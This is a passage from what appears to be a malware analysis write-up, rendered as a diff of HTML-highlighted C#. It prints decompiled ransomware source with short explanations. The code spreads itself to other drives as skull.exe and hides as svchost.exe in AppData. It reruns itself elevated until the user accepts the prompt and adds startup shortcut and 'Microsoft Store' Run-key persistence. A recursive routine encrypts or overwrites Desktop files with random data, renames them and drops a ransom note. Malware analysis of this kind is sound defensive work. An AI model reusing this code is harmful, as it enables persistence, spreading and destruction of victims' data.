+</span></span><span class="line"><span class="cl">				<span class="k">if</span> <span class="p">(</span><span class="n">driveInfo</span><span class="p">.</span><span class="n">ToString</span><span class="p">()</span> <span class="p">!=</span> <span class="s">&#34;C:\\&#34;</span> <span class="p">&amp;&amp;</span> <span class="p">!</span><span class="n">File</span><span class="p">.</span><span class="n">Exists</span><span class="p">(</span><span class="n">driveInfo</span><span class="p">.</span><span class="n">ToString</span><span class="p">()</span> <span class="p">+</span> <span class="n">spreadName</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">				<span class="p">{</span>
+</span></span><span class="line"><span class="cl">					<span class="k">try</span>
+</span></span><span class="line"><span class="cl">					<span class="p">{</span>
+</span></span><span class="line"><span class="cl">						<span class="n">File</span><span class="p">.</span><span class="n">Copy</span><span class="p">(</span><span class="n">Assembly</span><span class="p">.</span><span class="n">GetExecutingAssembly</span><span class="p">().</span><span class="n">Location</span><span class="p">,</span> <span class="n">driveInfo</span><span class="p">.</span><span class="n">ToString</span><span class="p">()</span> <span class="p">+</span> <span class="n">spreadName</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">					<span class="p">}</span>
+</span></span><span class="line"><span class="cl">					<span class="k">catch</span>
+</span></span><span class="line"><span class="cl">					<span class="p">{</span>
+</span></span><span class="line"><span class="cl">					<span class="p">}</span>
+</span></span><span class="line"><span class="cl">				<span class="p">}</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>the malware spreading itself across the computer&rsquo;s drives except for &ldquo;C&rdquo; under the name of skull.exe</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cs" data-lang="cs"><span class="line"><span class="cl"><span class="k">private</span> <span class="k">static</span> <span class="kt">string</span> <span class="n">processName</span> <span class="p">=</span> <span class="s">&#34;svchost.exe&#34;</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cs" data-lang="cs"><span class="line"><span class="cl"><span class="k">private</span> <span class="k">static</span> <span class="k">void</span> <span class="n">copyResistForAdmin</span><span class="p">(</span><span class="kt">string</span> <span class="n">processName</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="kt">string</span> <span class="n">friendlyName</span> <span class="p">=</span> <span class="n">AppDomain</span><span class="p">.</span><span class="n">CurrentDomain</span><span class="p">.</span><span class="n">FriendlyName</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="kt">string</span> <span class="n">location</span> <span class="p">=</span> <span class="n">Assembly</span><span class="p">.</span><span class="n">GetExecutingAssembly</span><span class="p">().</span><span class="n">Location</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="n">Environment</span><span class="p">.</span><span class="n">GetFolderPath</span><span class="p">(</span><span class="n">Environment</span><span class="p">.</span><span class="n">SpecialFolder</span><span class="p">.</span><span class="n">Startup</span><span class="p">)</span> <span class="p">+</span> <span class="s">&#34;\\&#34;</span> <span class="p">+</span> <span class="n">friendlyName</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="kt">string</span> <span class="n">text</span> <span class="p">=</span> <span class="n">Environment</span><span class="p">.</span><span class="n">GetFolderPath</span><span class="p">(</span><span class="n">Environment</span><span class="p">.</span><span class="n">SpecialFolder</span><span class="p">.</span><span class="n">ApplicationData</span><span class="p">)</span> <span class="p">+</span> <span class="s">&#34;\\&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="kt">string</span> <span class="n">text2</span> <span class="p">=</span> <span class="n">text</span> <span class="p">+</span> <span class="n">processName</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="n">ProcessStartInfo</span> <span class="n">startInfo</span> <span class="p">=</span> <span class="k">new</span> <span class="n">ProcessStartInfo</span><span class="p">(</span><span class="n">text2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">			<span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="n">UseShellExecute</span> <span class="p">=</span> <span class="k">true</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">				<span class="n">Verb</span> <span class="p">=</span> <span class="s">&#34;runas&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">				<span class="n">WindowStyle</span> <span class="p">=</span> <span class="n">ProcessWindowStyle</span><span class="p">.</span><span class="n">Normal</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">				<span class="n">WorkingDirectory</span> <span class="p">=</span> <span class="n">text</span>
+</span></span><span class="line"><span class="cl">			<span class="p">};</span>
+</span></span><span class="line"><span class="cl">			<span class="n">Process</span> <span class="n">process</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Process</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">			<span class="n">process</span><span class="p">.</span><span class="n">StartInfo</span> <span class="p">=</span> <span class="n">startInfo</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="p">(</span><span class="n">friendlyName</span> <span class="p">!=</span> <span class="n">processName</span> <span class="p">||</span> <span class="n">location</span> <span class="p">!=</span> <span class="n">text2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">			<span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="k">if</span> <span class="p">(!</span><span class="n">File</span><span class="p">.</span><span class="n">Exists</span><span class="p">(</span><span class="n">text2</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">				<span class="p">{</span>
+</span></span><span class="line"><span class="cl">					<span class="n">File</span><span class="p">.</span><span class="n">Copy</span><span class="p">(</span><span class="n">friendlyName</span><span class="p">,</span> <span class="n">text2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">					<span class="k">try</span>
+</span></span><span class="line"><span class="cl">					<span class="p">{</span>
+</span></span><span class="line"><span class="cl">						<span class="n">Process</span><span class="p">.</span><span class="n">Start</span><span class="p">(</span><span class="n">startInfo</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">						<span class="n">Environment</span><span class="p">.</span><span class="n">Exit</span><span class="p">(</span><span class="m">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">						<span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">					<span class="p">}</span>
+</span></span><span class="line"><span class="cl">					<span class="k">catch</span> <span class="p">(</span><span class="n">Win32Exception</span> <span class="n">ex</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">					<span class="p">{</span>
+</span></span><span class="line"><span class="cl">						<span class="k">if</span> <span class="p">(</span><span class="n">ex</span><span class="p">.</span><span class="n">NativeErrorCode</span> <span class="p">==</span> <span class="m">1223</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">						<span class="p">{</span>
+</span></span><span class="line"><span class="cl">							<span class="n">Program</span><span class="p">.</span><span class="n">copyResistForAdmin</span><span class="p">(</span><span class="n">processName</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">						<span class="p">}</span>
+</span></span><span class="line"><span class="cl">						<span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">					<span class="p">}</span>
+</span></span><span class="line"><span class="cl">				<span class="p">}</span>
+</span></span><span class="line"><span class="cl">				<span class="k">try</span>
+</span></span><span class="line"><span class="cl">				<span class="p">{</span>
+</span></span><span class="line"><span class="cl">					<span class="n">File</span><span class="p">.</span><span class="n">Delete</span><span class="p">(</span><span class="n">text2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">					<span class="n">Thread</span><span class="p">.</span><span class="n">Sleep</span><span class="p">(</span><span class="m">200</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">					<span class="n">File</span><span class="p">.</span><span class="n">Copy</span><span class="p">(</span><span class="n">friendlyName</span><span class="p">,</span> <span class="n">text2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">				<span class="p">}</span>
+</span></span><span class="line"><span class="cl">				<span class="k">catch</span>
+</span></span><span class="line"><span class="cl">				<span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="p">}</span>
+</span></span><span class="line"><span class="cl">				<span class="k">try</span>
+</span></span><span class="line"><span class="cl">				<span class="p">{</span>
+</span></span><span class="line"><span class="cl">					<span class="n">Process</span><span class="p">.</span><span class="n">Start</span><span class="p">(</span><span class="n">startInfo</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">					<span class="n">Environment</span><span class="p">.</span><span class="n">Exit</span><span class="p">(</span><span class="m">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">				<span class="p">}</span>
+</span></span><span class="line"><span class="cl">				<span class="k">catch</span> <span class="p">(</span><span class="n">Win32Exception</span> <span class="n">ex2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">				<span class="p">{</span>
+</span></span><span class="line"><span class="cl">					<span class="k">if</span> <span class="p">(</span><span class="n">ex2</span><span class="p">.</span><span class="n">NativeErrorCode</span> <span class="p">==</span> <span class="m">1223</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">					<span class="p">{</span>
+</span></span><span class="line"><span class="cl">						<span class="n">Program</span><span class="p">.</span><span class="n">copyResistForAdmin</span><span class="p">(</span><span class="n">processName</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">					<span class="p">}</span>
+</span></span><span class="line"><span class="cl">				<span class="p">}</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>Copies  Friendlyname (current executable name) if it doesnt already exist to <strong>/AppData/Roaming/</strong> under the name of <strong>svchost.exe</strong> then creates a new ProcessStartInfo object that specifies the process to start and sets the appropriate properties for the process to run with elevated privileges.</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cs" data-lang="cs"><span class="line"><span class="cl"><span class="k">private</span> <span class="k">static</span> <span class="k">void</span> <span class="n">addLinkToStartup</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">		<span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="kt">string</span> <span class="n">folderPath</span> <span class="p">=</span> <span class="n">Environment</span><span class="p">.</span><span class="n">GetFolderPath</span><span class="p">(</span><span class="n">Environment</span><span class="p">.</span><span class="n">SpecialFolder</span><span class="p">.</span><span class="n">Startup</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">			<span class="kt">string</span> <span class="n">str</span> <span class="p">=</span> <span class="n">Process</span><span class="p">.</span><span class="n">GetCurrentProcess</span><span class="p">().</span><span class="n">ProcessName</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="k">using</span> <span class="p">(</span><span class="n">StreamWriter</span> <span class="n">streamWriter</span> <span class="p">=</span> <span class="k">new</span> <span class="n">StreamWriter</span><span class="p">(</span><span class="n">folderPath</span> <span class="p">+</span> <span class="s">&#34;\\&#34;</span> <span class="p">+</span> <span class="n">str</span> <span class="p">+</span> <span class="s">&#34;.url&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">			<span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="kt">string</span> <span class="n">location</span> <span class="p">=</span> <span class="n">Assembly</span><span class="p">.</span><span class="n">GetExecutingAssembly</span><span class="p">().</span><span class="n">Location</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">				<span class="n">streamWriter</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;[InternetShortcut]&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">				<span class="n">streamWriter</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;URL=file:///&#34;</span> <span class="p">+</span> <span class="n">location</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">				<span class="n">streamWriter</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;IconIndex=0&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">				<span class="kt">string</span> <span class="n">str2</span> <span class="p">=</span> <span class="n">location</span><span class="p">.</span><span class="n">Replace</span><span class="p">(</span><span class="sc">&#39;\\&#39;</span><span class="p">,</span> <span class="sc">&#39;/&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">				<span class="n">streamWriter</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;IconFile=&#34;</span> <span class="p">+</span> <span class="n">str2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>also it adds a link file to this  path ( <strong>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</strong>)  under <strong>svchost.url</strong> .</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cs" data-lang="cs"><span class="line"><span class="cl"><span class="k">private</span> <span class="k">static</span> <span class="k">void</span> <span class="n">registryStartup</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">		<span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="k">try</span>
+</span></span><span class="line"><span class="cl">			<span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="n">RegistryKey</span> <span class="n">registryKey</span> <span class="p">=</span> <span class="n">Registry</span><span class="p">.</span><span class="n">CurrentUser</span><span class="p">.</span><span class="n">OpenSubKey</span><span class="p">(</span><span class="s">&#34;SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run&#34;</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">				<span class="n">registryKey</span><span class="p">.</span><span class="n">SetValue</span><span class="p">(</span><span class="s">&#34;Microsoft Store&#34;</span><span class="p">,</span> <span class="n">Assembly</span><span class="p">.</span><span class="n">GetExecutingAssembly</span><span class="p">().</span><span class="n">Location</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">			<span class="k">catch</span>
+</span></span><span class="line"><span class="cl">			<span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>utilizing the SetValue method to assign the location of the present executable file as the value for the &ldquo;<strong>Microsoft Store</strong>&rdquo; key. The objective is to add a registry entry to the Windows registry, which enables the current application to launch automatically during system startup</li>
+</ul>
+<h3 id="encryption-methodes">Encryption methodes</h3>
+<h4 id="directory-encryption">Directory Encryption</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cs" data-lang="cs"><span class="line"><span class="cl">	<span class="k">private</span> <span class="k">static</span> <span class="k">void</span> <span class="n">encryptDirectory</span><span class="p">(</span><span class="kt">string</span> <span class="n">location</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="k">try</span>
+</span></span><span class="line"><span class="cl">			<span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="kt">string</span><span class="p">[]</span> <span class="n">files</span> <span class="p">=</span> <span class="n">Directory</span><span class="p">.</span><span class="n">GetFiles</span><span class="p">(</span><span class="n">location</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">				<span class="kt">bool</span> <span class="n">flag</span> <span class="p">=</span> <span class="k">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">				<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span> <span class="n">i</span> <span class="p">&lt;</span> <span class="n">files</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span> <span class="n">i</span><span class="p">++)</span>
+</span></span><span class="line"><span class="cl">				<span class="p">{</span>
+</span></span><span class="line"><span class="cl">					<span class="k">try</span>
+</span></span><span class="line"><span class="cl">					<span class="p">{</span>
+</span></span><span class="line"><span class="cl">						<span class="kt">string</span> <span class="n">extension</span> <span class="p">=</span> <span class="n">Path</span><span class="p">.</span><span class="n">GetExtension</span><span class="p">(</span><span class="n">files</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">						<span class="kt">string</span> <span class="n">fileName</span> <span class="p">=</span> <span class="n">Path</span><span class="p">.</span><span class="n">GetFileName</span><span class="p">(</span><span class="n">files</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">						<span class="k">if</span> <span class="p">(</span><span class="n">Array</span><span class="p">.</span><span class="n">Exists</span><span class="p">&lt;</span><span class="kt">string</span><span class="p">&gt;(</span><span class="n">Program</span><span class="p">.</span><span class="n">validExtensions</span><span class="p">,</span> <span class="p">(</span><span class="kt">string</span> <span class="n">E</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="n">E</span> <span class="p">==</span> <span class="n">extension</span><span class="p">.</span><span class="n">ToLower</span><span class="p">())</span> <span class="p">&amp;&amp;</span> <span class="n">fileName</span> <span class="p">!=</span> <span class="n">Program</span><span class="p">.</span><span class="n">droppedMessageTextbox</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">						<span class="p">{</span>
+</span></span><span class="line"><span class="cl">							<span class="n">FileInfo</span> <span class="n">fileInfo</span> <span class="p">=</span> <span class="k">new</span> <span class="n">FileInfo</span><span class="p">(</span><span class="n">files</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">							<span class="n">fileInfo</span><span class="p">.</span><span class="n">Attributes</span> <span class="p">=</span> <span class="n">FileAttributes</span><span class="p">.</span><span class="n">Normal</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">							<span class="k">if</span> <span class="p">(</span><span class="n">fileInfo</span><span class="p">.</span><span class="n">Length</span> <span class="p">&lt;</span> <span class="m">2117152L</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">							<span class="p">{</span>
+</span></span><span class="line"><span class="cl">								<span class="k">if</span> <span class="p">(</span><span class="n">Program</span><span class="p">.</span><span class="n">encryptionAesRsa</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">								<span class="p">{</span>
+</span></span><span class="line"><span class="cl">									<span class="n">Program</span><span class="p">.</span><span class="n">EncryptFile</span><span class="p">(</span><span class="n">files</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">								<span class="p">}</span>
+</span></span><span class="line"><span class="cl">							<span class="p">}</span>
+</span></span><span class="line"><span class="cl">							<span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">fileInfo</span><span class="p">.</span><span class="n">Length</span> <span class="p">&gt;</span> <span class="m">200000000L</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">							<span class="p">{</span>
+</span></span><span class="line"><span class="cl">								<span class="n">Random</span> <span class="n">random</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Random</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">								<span class="kt">int</span> <span class="n">length</span> <span class="p">=</span> <span class="n">random</span><span class="p">.</span><span class="n">Next</span><span class="p">(</span><span class="m">200000000</span><span class="p">,</span> <span class="m">300000000</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">								<span class="kt">string</span> <span class="n">@string</span> <span class="p">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">UTF8</span><span class="p">.</span><span class="n">GetString</span><span class="p">(</span><span class="n">Program</span><span class="p">.</span><span class="n">random_bytes</span><span class="p">(</span><span class="n">length</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">								<span class="n">File</span><span class="p">.</span><span class="n">WriteAllText</span><span class="p">(</span><span class="n">files</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">Program</span><span class="p">.</span><span class="n">randomEncode</span><span class="p">(</span><span class="n">@string</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">								<span class="n">File</span><span class="p">.</span><span class="n">Move</span><span class="p">(</span><span class="n">files</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">files</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">+</span> <span class="s">&#34;.&#34;</span> <span class="p">+</span> <span class="n">Program</span><span class="p">.</span><span class="n">RandomStringForExtension</span><span class="p">(</span><span class="m">4</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">							<span class="p">}</span>
+</span></span><span class="line"><span class="cl">							<span class="k">else</span>
+</span></span><span class="line"><span class="cl">							<span class="p">{</span>
+</span></span><span class="line"><span class="cl">								<span class="kt">string</span> <span class="n">string2</span> <span class="p">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">UTF8</span><span class="p">.</span><span class="n">GetString</span><span class="p">(</span><span class="n">Program</span><span class="p">.</span><span class="n">random_bytes</span><span class="p">(</span><span class="n">Convert</span><span class="p">.</span><span class="n">ToInt32</span><span class="p">(</span><span class="n">fileInfo</span><span class="p">.</span><span class="n">Length</span><span class="p">)</span> <span class="p">/</span> <span class="m">4</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">								<span class="n">File</span><span class="p">.</span><span class="n">WriteAllText</span><span class="p">(</span><span class="n">files</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">Program</span><span class="p">.</span><span class="n">randomEncode</span><span class="p">(</span><span class="n">string2</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">								<span class="n">File</span><span class="p">.</span><span class="n">Move</span><span class="p">(</span><span class="n">files</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">files</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">+</span> <span class="s">&#34;.&#34;</span> <span class="p">+</span> <span class="n">Program</span><span class="p">.</span><span class="n">RandomStringForExtension</span><span class="p">(</span><span class="m">4</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">							<span class="p">}</span>
+</span></span><span class="line"><span class="cl">							<span class="k">if</span> <span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">							<span class="p">{</span>
+</span></span><span class="line"><span class="cl">								<span class="n">flag</span> <span class="p">=</span> <span class="k">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">								<span class="n">File</span><span class="p">.</span><span class="n">WriteAllLines</span><span class="p">(</span><span class="n">location</span> <span class="p">+</span> <span class="s">&#34;/&#34;</span> <span class="p">+</span> <span class="n">Program</span><span class="p">.</span><span class="n">droppedMessageTextbox</span><span class="p">,</span> <span class="n">Program</span><span class="p">.</span><span class="n">messages</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">							<span class="p">}</span>
+</span></span><span class="line"><span class="cl">						<span class="p">}</span>
+</span></span><span class="line"><span class="cl">					<span class="p">}</span>
+</span></span><span class="line"><span class="cl">					<span class="k">catch</span>
+</span></span><span class="line"><span class="cl">					<span class="p">{</span>
+</span></span><span class="line"><span class="cl">					<span class="p">}</span>
+</span></span><span class="line"><span class="cl">				<span class="p">}</span>
+</span></span><span class="line"><span class="cl">				<span class="kt">string</span><span class="p">[]</span> <span class="n">directories</span> <span class="p">=</span> <span class="n">Directory</span><span class="p">.</span><span class="n">GetDirectories</span><span class="p">(</span><span class="n">location</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">				<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span> <span class="n">j</span> <span class="p">&lt;</span> <span class="n">directories</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span> <span class="n">j</span><span class="p">++)</span>
+</span></span><span class="line"><span class="cl">				<span class="p">{</span>
+</span></span><span class="line"><span class="cl">					<span class="n">Program</span><span class="p">.</span><span class="n">encryptDirectory</span><span class="p">(</span><span class="n">directories</span><span class="p">[</span><span class="n">j</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">				<span class="p">}</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">			<span class="k">catch</span> <span class="p">(</span><span class="n">Exception</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">			<span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This function is responsible of encryption directories , it take <code>location</code> as an input . This <code>location</code> is defined in the <code>lookForDirectories</code>  function which refer to the <code>Desktop</code>
+directory in windows env .</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cs" data-lang="cs"><span class="line"><span class="cl">	<span class="kt">string</span> <span class="n">location</span> <span class="p">=</span> <span class="n">Program</span><span class="p">.</span><span class="n">userDir</span> <span class="p">+</span> <span class="n">Program</span><span class="p">.</span><span class="n">userName</span> <span class="p">+</span> <span class="s">&#34;\\Desktop&#34;</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
